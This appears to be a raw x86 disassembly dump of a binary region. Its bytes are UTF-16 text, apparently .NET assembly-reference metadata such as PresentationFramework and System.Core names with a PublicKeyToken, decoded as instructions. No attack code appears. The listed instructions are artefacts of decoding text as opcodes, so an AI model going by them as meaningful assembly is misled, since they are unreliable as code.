  4047b6:	xor    al,BYTE PTR [eax]
  4047b8:	popa   
  4047b9:	add    BYTE PTR [edx],dh
  4047bb:	add    BYTE PTR [edx+0x0],ah
  4047be:	xor    DWORD PTR [eax],eax
  4047c0:	xor    al,BYTE PTR [eax]
  4047c2:	xor    al,0x0
  4047c4:	aaa    
  4047c5:	add    BYTE PTR [ecx+0x0],ah
  4047c8:	add    BYTE PTR fs:[ebx+0x0],ah
  4047cc:	xor    eax,DWORD PTR [eax]
  4047ce:	add    BYTE PTR ss:0x62003200,dh
  4047d5:	add    BYTE PTR [esi+0x0],ah
  4047d8:	xor    eax,0x33006300
  4047dd:	add    BYTE PTR [eax],dh
  4047df:	add    BYTE PTR [eax],bh
  4047e1:	add    BYTE PTR [eax],dh
  4047e3:	add    BYTE PTR ds:0x64003500,dh
  4047e9:	add    BYTE PTR [ecx+0x0],ah
  4047ec:	cmp    DWORD PTR [eax],eax
  4047ee:	adc    al,0x50
  4047f1:	add    BYTE PTR [edx+0x0],dh
  4047f4:	add    BYTE PTR gs:[ebx+0x0],dh
  4047f8:	add    BYTE PTR gs:[esi+0x0],ch
  4047fc:	je     0x4047fe
  4047fe:	popa   
  4047ff:	add    BYTE PTR [eax+eax*1+0x69],dh
  404803:	add    BYTE PTR [edi+0x0],ch
  404806:	outs   dx,BYTE PTR ds:[esi]
  404807:	add    BYTE PTR [esi+0x0],al
  40480a:	jb     0x40480c
  40480c:	popa   
  40480d:	add    BYTE PTR [ebp+0x0],ch
  404810:	add    BYTE PTR gs:[edi+0x0],dh
  404814:	outs   dx,DWORD PTR ds:[esi]
  404815:	add    BYTE PTR [edx+0x0],dh
  404818:	imul   eax,DWORD PTR [eax],0x2e
  40481b:	add    BYTE PTR [edx+0x0],dl
  40481e:	outs   dx,DWORD PTR ds:[esi]
  40481f:	add    BYTE PTR [ecx+0x0],bh
  404822:	popa   
  404823:	add    BYTE PTR [eax+eax*1+0x65],ch
  404827:	add    BYTE PTR [eax+eax*1],ch
  40482a:	and    BYTE PTR [eax],al
  40482c:	push   eax
  40482d:	add    BYTE PTR [ebp+0x0],dh
  404830:	bound  eax,QWORD PTR [eax]
  404832:	ins    BYTE PTR es:[edi],dx
  404833:	add    BYTE PTR [ecx+0x0],ch
  404836:	arpl   WORD PTR [eax],ax
  404838:	dec    ebx
  404839:	add    BYTE PTR [ebp+0x0],ah
  40483c:	jns    0x40483e
  40483e:	cmp    eax,0x30003000
  404843:	add    BYTE PTR [edx],dh
  404845:	add    BYTE PTR [eax+eax*1],dh
  404848:	xor    BYTE PTR [eax],al
  40484a:	xor    BYTE PTR [eax],al
  40484c:	xor    BYTE PTR [eax],al
  40484e:	xor    BYTE PTR [eax],al
  404850:	xor    BYTE PTR [eax],al
  404852:	xor    al,0x0
  404854:	cmp    BYTE PTR [eax],al
  404856:	xor    BYTE PTR [eax],al
  404858:	xor    BYTE PTR [eax],al
  40485a:	xor    BYTE PTR [eax],al
  40485c:	xor    BYTE PTR [eax],al
  40485e:	xor    BYTE PTR [eax],al
  404860:	cmp    DWORD PTR [eax],eax
  404862:	xor    al,0x0
  404864:	xor    BYTE PTR [eax],al
  404866:	xor    BYTE PTR [eax],al
  404868:	xor    BYTE PTR [eax],al
  40486a:	xor    BYTE PTR [eax],al
  40486c:	xor    BYTE PTR [eax],al
  40486e:	xor    BYTE PTR [eax],al
  404870:	xor    BYTE PTR [eax],al
  404872:	add    BYTE PTR ss:[eax],dh
  404875:	add    BYTE PTR [edx],dh
  404877:	add    BYTE PTR [eax],dh
  404879:	add    BYTE PTR [eax],dh
  40487b:	add    BYTE PTR [eax],dh
  40487d:	add    BYTE PTR [eax],dh
  40487f:	add    BYTE PTR [eax],dh
  404881:	add    BYTE PTR [eax],dh
  404883:	add    BYTE PTR [edx],dh
  404885:	add    BYTE PTR [eax+eax*1],dh
  404888:	xor    BYTE PTR [eax],al
  40488a:	xor    BYTE PTR [eax],al
  40488c:	xor    BYTE PTR [eax],al
  40488e:	xor    BYTE PTR [eax],al
  404890:	xor    eax,0x35003200
  404895:	add    BYTE PTR [ebx],dh
  404897:	add    BYTE PTR [eax+eax*1],dh
  40489a:	xor    DWORD PTR [eax],eax
  40489c:	xor    eax,DWORD PTR [eax]
  40489e:	xor    DWORD PTR [eax],eax
  4048a0:	xor    BYTE PTR [eax],al
  4048a2:	xor    BYTE PTR [eax],al
  4048a4:	xor    BYTE PTR [eax],al
  4048a6:	xor    al,0x0
  4048a8:	xor    BYTE PTR [eax],al
  4048aa:	xor    BYTE PTR [eax],al
  4048ac:	xor    BYTE PTR [eax],al
  4048ae:	xor    BYTE PTR [eax],al
  4048b0:	xor    BYTE PTR [eax],al
  4048b2:	xor    DWORD PTR [eax],eax
  4048b4:	xor    BYTE PTR [eax],al
  4048b6:	xor    BYTE PTR [eax],al
  4048b8:	xor    BYTE PTR [eax],al
  4048ba:	xor    DWORD PTR [eax],eax
  4048bc:	xor    BYTE PTR [eax],al
  4048be:	xor    BYTE PTR [eax],al
  4048c0:	bound  eax,QWORD PTR [eax]
  4048c2:	xor    eax,0x63006600
  4048c7:	add    BYTE PTR [ecx],bh
  4048c9:	add    BYTE PTR [eax],dh
  4048cb:	add    BYTE PTR [ebp+0x0],ah
  4048ce:	aaa    
  4048cf:	add    BYTE PTR [eax],dh
  4048d1:	add    BYTE PTR [edx],dh
  4048d3:	add    BYTE PTR [edi],dh
  4048d5:	add    BYTE PTR [esi+0x0],ah
  4048d8:	add    BYTE PTR ss:[edi],dh
  4048db:	add    BYTE PTR [eax],bh
  4048dd:	add    BYTE PTR [edi],dh
  4048df:	add    BYTE PTR [ecx],dh
  4048e1:	add    BYTE PTR [ebp+0x0],ah
  4048e4:	aaa    
  4048e5:	add    BYTE PTR [edi],dh
  4048e7:	add    BYTE PTR [ebx],dh
  4048e9:	add    BYTE PTR [ecx+0x0],ah
  4048ec:	cmp    BYTE PTR [eax],al
  4048ee:	data16 add BYTE PTR [eax+eax*1+0x65],ah
  4048f3:	add    BYTE PTR [eax],bh
  4048f5:	add    BYTE PTR [ecx],bh
  4048f7:	add    BYTE PTR [ebx],dh
  4048f9:	add    BYTE PTR [eax],bh
  4048fb:	add    BYTE PTR [ebx+0x0],ah
  4048fe:	cmp    BYTE PTR [eax],al
  404900:	xor    DWORD PTR [eax],eax
  404902:	add    BYTE PTR fs:[eax+eax*1+0x34],ah
  404907:	add    BYTE PTR [eax],dh
  404909:	add    BYTE PTR [edx],dh
  40490b:	add    BYTE PTR [edx+0x0],ah
  40490e:	popa   
  40490f:	add    BYTE PTR [esi],dh
  404911:	add    BYTE PTR ds:0x39006200,dh
  404917:	add    BYTE PTR [edx],dh
  404919:	add    BYTE PTR [eax],dh
  40491b:	add    BYTE PTR [ecx],dh
  40491d:	add    BYTE PTR [eax+eax*1+0x36],ah
  404921:	add    BYTE PTR [eax],dh
  404923:	add    BYTE PTR ds:0x33003900,dh
  404929:	add    BYTE PTR [ebp+0x0],ah
  40492c:	cmp    DWORD PTR [eax],eax
  40492e:	add    BYTE PTR ss:[ebx+0x0],ah
  404932:	xor    al,0x0
  404934:	cmp    DWORD PTR [eax],eax
  404936:	xor    al,BYTE PTR [eax]
  404938:	add    BYTE PTR ss:0x65003100,dh
  40493f:	add    BYTE PTR [eax],bh
  404941:	add    BYTE PTR [eax],bh
  404943:	add    BYTE PTR [ecx],bh
  404945:	add    BYTE PTR [ebx+0x0],ah
  404948:	arpl   WORD PTR [eax],ax
  40494a:	xor    DWORD PTR [eax],eax
  40494c:	xor    eax,DWORD PTR [eax]
  40494e:	data16 add BYTE PTR [ecx],dh
  404951:	add    BYTE PTR [eax+eax*1],dh
  404954:	xor    DWORD PTR [eax],eax
  404956:	xor    eax,0x62006500
  40495b:	add    BYTE PTR [edx+0x0],ah
  40495e:	xor    eax,0x66003300
  404963:	add    BYTE PTR [ecx+0x0],ah
  404966:	arpl   WORD PTR [eax],ax
  404968:	xor    DWORD PTR [eax],eax
  40496a:	xor    DWORD PTR [eax],eax
  40496c:	xor    eax,DWORD PTR [eax]
  40496e:	xor    DWORD PTR [eax],eax
  404970:	popa   
  404971:	add    BYTE PTR [ebp+0x0],ah
  404974:	xor    BYTE PTR [eax],al
  404976:	bound  eax,QWORD PTR [eax]
  404978:	add    BYTE PTR fs:[ebx],dh
  40497b:	add    BYTE PTR [ebx],dh
  40497d:	add    BYTE PTR [ebx],dh
  40497f:	add    BYTE PTR [ebx+0x0],ah
  404982:	xor    eax,0x65006500
  404987:	add    BYTE PTR [esi],dh
  404989:	add    BYTE PTR [eax],dh
  40498b:	add    BYTE PTR [edx],dh
  40498d:	add    BYTE PTR [ecx],dh
  40498f:	add    BYTE PTR [esi],dh
  404991:	add    BYTE PTR [edi],dh
  404993:	add    BYTE PTR [edx],dh
  404995:	add    BYTE PTR [eax+eax*1+0x39],ah
  404999:	add    BYTE PTR [edi],dh
  40499b:	add    BYTE PTR [ecx],dh
  40499d:	add    BYTE PTR [eax],bh
  40499f:	add    BYTE PTR [ebp+0x0],ah
  4049a2:	popa   
  4049a3:	add    BYTE PTR [ebx],dh
  4049a5:	add    BYTE PTR [ecx],dh
  4049a7:	add    BYTE PTR [ecx+0x0],ah
  4049aa:	cmp    BYTE PTR [eax],al
  4049ac:	popa   
  4049ad:	add    BYTE PTR [ebp+0x0],ah
  4049b0:	bound  eax,QWORD PTR [eax]
  4049b2:	add    BYTE PTR fs:[eax],dh
  4049b5:	add    BYTE PTR [eax+eax*1+0x61],ah
  4049b9:	add    BYTE PTR [eax],dh
  4049bb:	add    BYTE PTR [eax],dh
  4049bd:	add    BYTE PTR [edi],dh
  4049bf:	add    BYTE PTR [edx],dh
  4049c1:	add    BYTE PTR [esi+0x0],ah
  4049c4:	xor    al,BYTE PTR [eax]
  4049c6:	xor    eax,0x38006400
  4049cb:	add    BYTE PTR [edi],dh
  4049cd:	add    BYTE PTR [eax+eax*1+0x62],ah
  4049d1:	add    BYTE PTR [ecx+0x0],ah
  4049d4:	add    BYTE PTR ss:[esi+0x0],ah
  4049d8:	arpl   WORD PTR [eax],ax
  4049da:	cmp    DWORD PTR [eax],eax
  4049dc:	xor    BYTE PTR [eax],al
  4049de:	data16 add BYTE PTR [esi+0x0],ah
  4049e2:	add    BYTE PTR fs:0x38003900,dh
  4049e9:	add    BYTE PTR [ebp+0x0],ah
  4049ec:	add    BYTE PTR fs:[eax+eax*1],dh
  4049f0:	add    BYTE PTR fs:[ecx+0x0],ah
  4049f4:	xor    eax,DWORD PTR [eax]
  4049f6:	xor    eax,0x34006500
  4049fb:	add    BYTE PTR [eax+eax*1],dh
  4049fe:	arpl   WORD PTR [eax],ax
  404a00:	xor    eax,DWORD PTR [eax]
  404a02:	cmp    DWORD PTR [eax],eax
  404a04:	cmp    BYTE PTR [eax],al
  404a06:	arpl   WORD PTR [eax],ax
  404a08:	xor    al,0x0
  404a0a:	xor    eax,0x33003400
  404a0f:	add    BYTE PTR [eax],dh
  404a11:	add    BYTE PTR [edi],dh
  404a13:	add    BYTE PTR [ebp+0x0],ah
  404a16:	cmp    BYTE PTR [eax],al
  404a18:	add    BYTE PTR gs:[ebx],dh
  404a1b:	add    BYTE PTR [ebx],dh
  404a1d:	add    BYTE PTR [edx+0x0],ah
  404a20:	cmp    BYTE PTR [eax],al
  404a22:	xor    al,0x0
  404a24:	xor    al,BYTE PTR [eax]
  404a26:	add    BYTE PTR ss:[ecx],dh
  404a29:	add    BYTE PTR [eax+eax*1],dh
  404a2c:	xor    eax,DWORD PTR [eax]
  404a2e:	add    BYTE PTR fs:[ecx+0x0],ah
  404a32:	add    BYTE PTR gs:[ebx+0x0],ah
  404a36:	cmp    DWORD PTR [eax],eax
  404a38:	data16 add BYTE PTR ds:0x36003900,dh
  404a3f:	add    BYTE PTR [eax],bh
  404a41:	add    BYTE PTR [ebx],dh
  404a43:	add    BYTE PTR [esi],dh
  404a45:	add    BYTE PTR [esi+0x0],ah
  404a48:	cmp    DWORD PTR [eax],eax
  404a4a:	aaa    
  404a4b:	add    BYTE PTR [ebx+0x0],ah
  404a4e:	cmp    BYTE PTR [eax],al
  404a50:	data16 add BYTE PTR [edi],dh
  404a53:	add    BYTE PTR [eax+eax*1],dh
  404a56:	aaa    
  404a57:	add    BYTE PTR ds:0x65003000,dh
  404a5d:	add    BYTE PTR ds:0x37003900,dh
  404a63:	add    BYTE PTR ds:0x36006300,dh
  404a69:	add    BYTE PTR [eax+eax*1],dh
  404a6c:	add    BYTE PTR gs:[edx],dh
  404a6f:	add    BYTE PTR [ecx],dh
  404a71:	add    BYTE PTR [eax],bh
  404a73:	add    BYTE PTR [ecx],bh
  404a75:	add    BYTE PTR [esi+0x0],ah
  404a78:	xor    al,0x0
  404a7a:	xor    eax,0x65006400
  404a7f:	add    BYTE PTR [esi+0x0],ah
  404a82:	xor    al,0x0
  404a84:	add    BYTE PTR ss:[edx+0x0],ah
  404a88:	xor    al,BYTE PTR [eax]
  404a8a:	popa   
  404a8b:	add    BYTE PTR [edx],dh
  404a8d:	add    BYTE PTR [edx+0x0],ah
  404a90:	xor    DWORD PTR [eax],eax
  404a92:	xor    al,BYTE PTR [eax]
  404a94:	xor    al,0x0
  404a96:	aaa    
  404a97:	add    BYTE PTR [ecx+0x0],ah
  404a9a:	add    BYTE PTR fs:[ebx+0x0],ah
  404a9e:	xor    eax,DWORD PTR [eax]
  404aa0:	add    BYTE PTR ss:0x62003200,dh
  404aa7:	add    BYTE PTR [esi+0x0],ah
  404aaa:	xor    eax,0x33006300
  404aaf:	add    BYTE PTR [eax],dh
  404ab1:	add    BYTE PTR [eax],bh
  404ab3:	add    BYTE PTR [eax],dh
  404ab5:	add    BYTE PTR ds:0x64003500,dh
  404abb:	add    BYTE PTR [ecx+0x0],ah
  404abe:	cmp    DWORD PTR [eax],eax
  404ac0:	or     ah,0x50
  404ac3:	add    BYTE PTR [edx+0x0],dh
  404ac6:	add    BYTE PTR gs:[ebx+0x0],dh
  404aca:	add    BYTE PTR gs:[esi+0x0],ch
  404ace:	je     0x404ad0
  404ad0:	popa   
  404ad1:	add    BYTE PTR [eax+eax*1+0x69],dh
  404ad5:	add    BYTE PTR [edi+0x0],ch
  404ad8:	outs   dx,BYTE PTR ds:[esi]
  404ad9:	add    BYTE PTR [esi+0x0],al
  404adc:	jb     0x404ade
  404ade:	popa   
  404adf:	add    BYTE PTR [ebp+0x0],ch
  404ae2:	add    BYTE PTR gs:[edi+0x0],dh
  404ae6:	outs   dx,DWORD PTR ds:[esi]
  404ae7:	add    BYTE PTR [edx+0x0],dh
  404aea:	imul   eax,DWORD PTR [eax],0x2e
  404aed:	add    BYTE PTR [ecx+0x0],al
  404af0:	add    BYTE PTR gs:[edx+0x0],dh
  404af4:	outs   dx,DWORD PTR ds:[esi]
  404af5:	add    BYTE PTR [eax+eax*1],ch
  404af8:	and    BYTE PTR [eax],al
  404afa:	push   eax
  404afb:	add    BYTE PTR [ebp+0x0],dh
  404afe:	bound  eax,QWORD PTR [eax]
  404b00:	ins    BYTE PTR es:[edi],dx
  404b01:	add    BYTE PTR [ecx+0x0],ch
  404b04:	arpl   WORD PTR [eax],ax
  404b06:	dec    ebx
  404b07:	add    BYTE PTR [ebp+0x0],ah
  404b0a:	jns    0x404b0c
  404b0c:	cmp    eax,0x30003000
  404b11:	add    BYTE PTR [edx],dh
  404b13:	add    BYTE PTR [eax+eax*1],dh
  404b16:	xor    BYTE PTR [eax],al
  404b18:	xor    BYTE PTR [eax],al
  404b1a:	xor    BYTE PTR [eax],al
  404b1c:	xor    BYTE PTR [eax],al
  404b1e:	xor    BYTE PTR [eax],al
  404b20:	xor    al,0x0
  404b22:	cmp    BYTE PTR [eax],al
  404b24:	xor    BYTE PTR [eax],al
  404b26:	xor    BYTE PTR [eax],al
  404b28:	xor    BYTE PTR [eax],al
  404b2a:	xor    BYTE PTR [eax],al
  404b2c:	xor    BYTE PTR [eax],al
  404b2e:	cmp    DWORD PTR [eax],eax
  404b30:	xor    al,0x0
  404b32:	xor    BYTE PTR [eax],al
  404b34:	xor    BYTE PTR [eax],al
  404b36:	xor    BYTE PTR [eax],al
  404b38:	xor    BYTE PTR [eax],al
  404b3a:	xor    BYTE PTR [eax],al
  404b3c:	xor    BYTE PTR [eax],al
  404b3e:	xor    BYTE PTR [eax],al
  404b40:	add    BYTE PTR ss:[eax],dh
  404b43:	add    BYTE PTR [edx],dh
  404b45:	add    BYTE PTR [eax],dh
  404b47:	add    BYTE PTR [eax],dh
  404b49:	add    BYTE PTR [eax],dh
  404b4b:	add    BYTE PTR [eax],dh
  404b4d:	add    BYTE PTR [eax],dh
  404b4f:	add    BYTE PTR [eax],dh
  404b51:	add    BYTE PTR [edx],dh
  404b53:	add    BYTE PTR [eax+eax*1],dh
  404b56:	xor    BYTE PTR [eax],al
  404b58:	xor    BYTE PTR [eax],al
  404b5a:	xor    BYTE PTR [eax],al
  404b5c:	xor    BYTE PTR [eax],al
  404b5e:	xor    eax,0x35003200
  404b63:	add    BYTE PTR [ebx],dh
  404b65:	add    BYTE PTR [eax+eax*1],dh
  404b68:	xor    DWORD PTR [eax],eax
  404b6a:	xor    eax,DWORD PTR [eax]
  404b6c:	xor    DWORD PTR [eax],eax
  404b6e:	xor    BYTE PTR [eax],al
  404b70:	xor    BYTE PTR [eax],al
  404b72:	xor    BYTE PTR [eax],al
  404b74:	xor    al,0x0
  404b76:	xor    BYTE PTR [eax],al
  404b78:	xor    BYTE PTR [eax],al
  404b7a:	xor    BYTE PTR [eax],al
  404b7c:	xor    BYTE PTR [eax],al
  404b7e:	xor    BYTE PTR [eax],al
  404b80:	xor    DWORD PTR [eax],eax
  404b82:	xor    BYTE PTR [eax],al
  404b84:	xor    BYTE PTR [eax],al
  404b86:	xor    BYTE PTR [eax],al
  404b88:	xor    DWORD PTR [eax],eax
  404b8a:	xor    BYTE PTR [eax],al
  404b8c:	xor    BYTE PTR [eax],al
  404b8e:	bound  eax,QWORD PTR [eax]
  404b90:	xor    eax,0x63006600
  404b95:	add    BYTE PTR [ecx],bh
  404b97:	add    BYTE PTR [eax],dh
  404b99:	add    BYTE PTR [ebp+0x0],ah
  404b9c:	aaa    
  404b9d:	add    BYTE PTR [eax],dh
  404b9f:	add    BYTE PTR [edx],dh
  404ba1:	add    BYTE PTR [edi],dh
  404ba3:	add    BYTE PTR [esi+0x0],ah
  404ba6:	add    BYTE PTR ss:[edi],dh
  404ba9:	add    BYTE PTR [eax],bh
  404bab:	add    BYTE PTR [edi],dh
  404bad:	add    BYTE PTR [ecx],dh
  404baf:	add    BYTE PTR [ebp+0x0],ah
  404bb2:	aaa    
  404bb3:	add    BYTE PTR [edi],dh
  404bb5:	add    BYTE PTR [ebx],dh
  404bb7:	add    BYTE PTR [ecx+0x0],ah
  404bba:	cmp    BYTE PTR [eax],al
  404bbc:	data16 add BYTE PTR [eax+eax*1+0x65],ah
  404bc1:	add    BYTE PTR [eax],bh
  404bc3:	add    BYTE PTR [ecx],bh
  404bc5:	add    BYTE PTR [ebx],dh
  404bc7:	add    BYTE PTR [eax],bh
  404bc9:	add    BYTE PTR [ebx+0x0],ah
  404bcc:	cmp    BYTE PTR [eax],al
  404bce:	xor    DWORD PTR [eax],eax
  404bd0:	add    BYTE PTR fs:[eax+eax*1+0x34],ah
  404bd5:	add    BYTE PTR [eax],dh
  404bd7:	add    BYTE PTR [edx],dh
  404bd9:	add    BYTE PTR [edx+0x0],ah
  404bdc:	popa   
  404bdd:	add    BYTE PTR [esi],dh
  404bdf:	add    BYTE PTR ds:0x39006200,dh
  404be5:	add    BYTE PTR [edx],dh
  404be7:	add    BYTE PTR [eax],dh
  404be9:	add    BYTE PTR [ecx],dh
  404beb:	add    BYTE PTR [eax+eax*1+0x36],ah
  404bef:	add    BYTE PTR [eax],dh
  404bf1:	add    BYTE PTR ds:0x33003900,dh
  404bf7:	add    BYTE PTR [ebp+0x0],ah
  404bfa:	cmp    DWORD PTR [eax],eax
  404bfc:	add    BYTE PTR ss:[ebx+0x0],ah
  404c00:	xor    al,0x0
  404c02:	cmp    DWORD PTR [eax],eax
  404c04:	xor    al,BYTE PTR [eax]
  404c06:	add    BYTE PTR ss:0x65003100,dh
  404c0d:	add    BYTE PTR [eax],bh
  404c0f:	add    BYTE PTR [eax],bh
  404c11:	add    BYTE PTR [ecx],bh
  404c13:	add    BYTE PTR [ebx+0x0],ah
  404c16:	arpl   WORD PTR [eax],ax
  404c18:	xor    DWORD PTR [eax],eax
  404c1a:	xor    eax,DWORD PTR [eax]
  404c1c:	data16 add BYTE PTR [ecx],dh
  404c1f:	add    BYTE PTR [eax+eax*1],dh
  404c22:	xor    DWORD PTR [eax],eax
  404c24:	xor    eax,0x62006500
  404c29:	add    BYTE PTR [edx+0x0],ah
  404c2c:	xor    eax,0x66003300
  404c31:	add    BYTE PTR [ecx+0x0],ah
  404c34:	arpl   WORD PTR [eax],ax
  404c36:	xor    DWORD PTR [eax],eax
  404c38:	xor    DWORD PTR [eax],eax
  404c3a:	xor    eax,DWORD PTR [eax]
  404c3c:	xor    DWORD PTR [eax],eax
  404c3e:	popa   
  404c3f:	add    BYTE PTR [ebp+0x0],ah
  404c42:	xor    BYTE PTR [eax],al
  404c44:	bound  eax,QWORD PTR [eax]
  404c46:	add    BYTE PTR fs:[ebx],dh
  404c49:	add    BYTE PTR [ebx],dh
  404c4b:	add    BYTE PTR [ebx],dh
  404c4d:	add    BYTE PTR [ebx+0x0],ah
  404c50:	xor    eax,0x65006500
  404c55:	add    BYTE PTR [esi],dh
  404c57:	add    BYTE PTR [eax],dh
  404c59:	add    BYTE PTR [edx],dh
  404c5b:	add    BYTE PTR [ecx],dh
  404c5d:	add    BYTE PTR [esi],dh
  404c5f:	add    BYTE PTR [edi],dh
  404c61:	add    BYTE PTR [edx],dh
  404c63:	add    BYTE PTR [eax+eax*1+0x39],ah
  404c67:	add    BYTE PTR [edi],dh
  404c69:	add    BYTE PTR [ecx],dh
  404c6b:	add    BYTE PTR [eax],bh
  404c6d:	add    BYTE PTR [ebp+0x0],ah
  404c70:	popa   
  404c71:	add    BYTE PTR [ebx],dh
  404c73:	add    BYTE PTR [ecx],dh
  404c75:	add    BYTE PTR [ecx+0x0],ah
  404c78:	cmp    BYTE PTR [eax],al
  404c7a:	popa   
  404c7b:	add    BYTE PTR [ebp+0x0],ah
  404c7e:	bound  eax,QWORD PTR [eax]
  404c80:	add    BYTE PTR fs:[eax],dh
  404c83:	add    BYTE PTR [eax+eax*1+0x61],ah
  404c87:	add    BYTE PTR [eax],dh
  404c89:	add    BYTE PTR [eax],dh
  404c8b:	add    BYTE PTR [edi],dh
  404c8d:	add    BYTE PTR [edx],dh
  404c8f:	add    BYTE PTR [esi+0x0],ah
  404c92:	xor    al,BYTE PTR [eax]
  404c94:	xor    eax,0x38006400
  404c99:	add    BYTE PTR [edi],dh
  404c9b:	add    BYTE PTR [eax+eax*1+0x62],ah
  404c9f:	add    BYTE PTR [ecx+0x0],ah
  404ca2:	add    BYTE PTR ss:[esi+0x0],ah
  404ca6:	arpl   WORD PTR [eax],ax
  404ca8:	cmp    DWORD PTR [eax],eax
  404caa:	xor    BYTE PTR [eax],al
  404cac:	data16 add BYTE PTR [esi+0x0],ah
  404cb0:	add    BYTE PTR fs:0x38003900,dh
  404cb7:	add    BYTE PTR [ebp+0x0],ah
  404cba:	add    BYTE PTR fs:[eax+eax*1],dh
  404cbe:	add    BYTE PTR fs:[ecx+0x0],ah
  404cc2:	xor    eax,DWORD PTR [eax]
  404cc4:	xor    eax,0x34006500
  404cc9:	add    BYTE PTR [eax+eax*1],dh
  404ccc:	arpl   WORD PTR [eax],ax
  404cce:	xor    eax,DWORD PTR [eax]
  404cd0:	cmp    DWORD PTR [eax],eax
  404cd2:	cmp    BYTE PTR [eax],al
  404cd4:	arpl   WORD PTR [eax],ax
  404cd6:	xor    al,0x0
  404cd8:	xor    eax,0x33003400
  404cdd:	add    BYTE PTR [eax],dh
  404cdf:	add    BYTE PTR [edi],dh
  404ce1:	add    BYTE PTR [ebp+0x0],ah
  404ce4:	cmp    BYTE PTR [eax],al
  404ce6:	add    BYTE PTR gs:[ebx],dh
  404ce9:	add    BYTE PTR [ebx],dh
  404ceb:	add    BYTE PTR [edx+0x0],ah
  404cee:	cmp    BYTE PTR [eax],al
  404cf0:	xor    al,0x0
  404cf2:	xor    al,BYTE PTR [eax]
  404cf4:	add    BYTE PTR ss:[ecx],dh
  404cf7:	add    BYTE PTR [eax+eax*1],dh
  404cfa:	xor    eax,DWORD PTR [eax]
  404cfc:	add    BYTE PTR fs:[ecx+0x0],ah
  404d00:	add    BYTE PTR gs:[ebx+0x0],ah
  404d04:	cmp    DWORD PTR [eax],eax
  404d06:	data16 add BYTE PTR ds:0x36003900,dh
  404d0d:	add    BYTE PTR [eax],bh
  404d0f:	add    BYTE PTR [ebx],dh
  404d11:	add    BYTE PTR [esi],dh
  404d13:	add    BYTE PTR [esi+0x0],ah
  404d16:	cmp    DWORD PTR [eax],eax
  404d18:	aaa    
  404d19:	add    BYTE PTR [ebx+0x0],ah
  404d1c:	cmp    BYTE PTR [eax],al
  404d1e:	data16 add BYTE PTR [edi],dh
  404d21:	add    BYTE PTR [eax+eax*1],dh
  404d24:	aaa    
  404d25:	add    BYTE PTR ds:0x65003000,dh
  404d2b:	add    BYTE PTR ds:0x37003900,dh
  404d31:	add    BYTE PTR ds:0x36006300,dh
  404d37:	add    BYTE PTR [eax+eax*1],dh
  404d3a:	add    BYTE PTR gs:[edx],dh
  404d3d:	add    BYTE PTR [ecx],dh
  404d3f:	add    BYTE PTR [eax],bh
  404d41:	add    BYTE PTR [ecx],bh
  404d43:	add    BYTE PTR [esi+0x0],ah
  404d46:	xor    al,0x0
  404d48:	xor    eax,0x65006400
  404d4d:	add    BYTE PTR [esi+0x0],ah
  404d50:	xor    al,0x0
  404d52:	add    BYTE PTR ss:[edx+0x0],ah
  404d56:	xor    al,BYTE PTR [eax]
  404d58:	popa   
  404d59:	add    BYTE PTR [edx],dh
  404d5b:	add    BYTE PTR [edx+0x0],ah
  404d5e:	xor    DWORD PTR [eax],eax
  404d60:	xor    al,BYTE PTR [eax]
  404d62:	xor    al,0x0
  404d64:	aaa    
  404d65:	add    BYTE PTR [ecx+0x0],ah
  404d68:	add    BYTE PTR fs:[ebx+0x0],ah
  404d6c:	xor    eax,DWORD PTR [eax]
  404d6e:	add    BYTE PTR ss:0x62003200,dh
  404d75:	add    BYTE PTR [esi+0x0],ah
  404d78:	xor    eax,0x33006300
  404d7d:	add    BYTE PTR [eax],dh
  404d7f:	add    BYTE PTR [eax],bh
  404d81:	add    BYTE PTR [eax],dh
  404d83:	add    BYTE PTR ds:0x64003500,dh
  404d89:	add    BYTE PTR [ecx+0x0],ah
  404d8c:	cmp    DWORD PTR [eax],eax
  404d8e:	adc    dl,0x50
  404d91:	add    BYTE PTR [edx+0x0],dh
  404d94:	add    BYTE PTR gs:[ebx+0x0],dh
  404d98:	add    BYTE PTR gs:[esi+0x0],ch
  404d9c:	je     0x404d9e
  404d9e:	popa   
  404d9f:	add    BYTE PTR [eax+eax*1+0x69],dh
  404da3:	add    BYTE PTR [edi+0x0],ch
  404da6:	outs   dx,BYTE PTR ds:[esi]
  404da7:	add    BYTE PTR [esi+0x0],al
  404daa:	jb     0x404dac
  404dac:	popa   
  404dad:	add    BYTE PTR [ebp+0x0],ch
  404db0:	add    BYTE PTR gs:[edi+0x0],dh
  404db4:	outs   dx,DWORD PTR ds:[esi]
  404db5:	add    BYTE PTR [edx+0x0],dh
  404db8:	imul   eax,DWORD PTR [eax],0x2e
  404dbb:	add    BYTE PTR [ebx+0x0],al
  404dbe:	ins    BYTE PTR es:[edi],dx
  404dbf:	add    BYTE PTR [ecx+0x0],ah
  404dc2:	jae    0x404dc4
  404dc4:	jae    0x404dc6
  404dc6:	imul   eax,DWORD PTR [eax],0x2c0063
  404dcc:	and    BYTE PTR [eax],al
  404dce:	push   eax
  404dcf:	add    BYTE PTR [ebp+0x0],dh
  404dd2:	bound  eax,QWORD PTR [eax]
  404dd4:	ins    BYTE PTR es:[edi],dx
  404dd5:	add    BYTE PTR [ecx+0x0],ch
  404dd8:	arpl   WORD PTR [eax],ax
  404dda:	dec    ebx
  404ddb:	add    BYTE PTR [ebp+0x0],ah
  404dde:	jns    0x404de0
  404de0:	cmp    eax,0x30003000
  404de5:	add    BYTE PTR [edx],dh
  404de7:	add    BYTE PTR [eax+eax*1],dh
  404dea:	xor    BYTE PTR [eax],al
  404dec:	xor    BYTE PTR [eax],al
  404dee:	xor    BYTE PTR [eax],al
  404df0:	xor    BYTE PTR [eax],al
  404df2:	xor    BYTE PTR [eax],al
  404df4:	xor    al,0x0
  404df6:	cmp    BYTE PTR [eax],al
  404df8:	xor    BYTE PTR [eax],al
  404dfa:	xor    BYTE PTR [eax],al
  404dfc:	xor    BYTE PTR [eax],al
  404dfe:	xor    BYTE PTR [eax],al
  404e00:	xor    BYTE PTR [eax],al
  404e02:	cmp    DWORD PTR [eax],eax
  404e04:	xor    al,0x0
  404e06:	xor    BYTE PTR [eax],al
  404e08:	xor    BYTE PTR [eax],al
  404e0a:	xor    BYTE PTR [eax],al
  404e0c:	xor    BYTE PTR [eax],al
  404e0e:	xor    BYTE PTR [eax],al
  404e10:	xor    BYTE PTR [eax],al
  404e12:	xor    BYTE PTR [eax],al
  404e14:	add    BYTE PTR ss:[eax],dh
  404e17:	add    BYTE PTR [edx],dh
  404e19:	add    BYTE PTR [eax],dh
  404e1b:	add    BYTE PTR [eax],dh
  404e1d:	add    BYTE PTR [eax],dh
  404e1f:	add    BYTE PTR [eax],dh
  404e21:	add    BYTE PTR [eax],dh
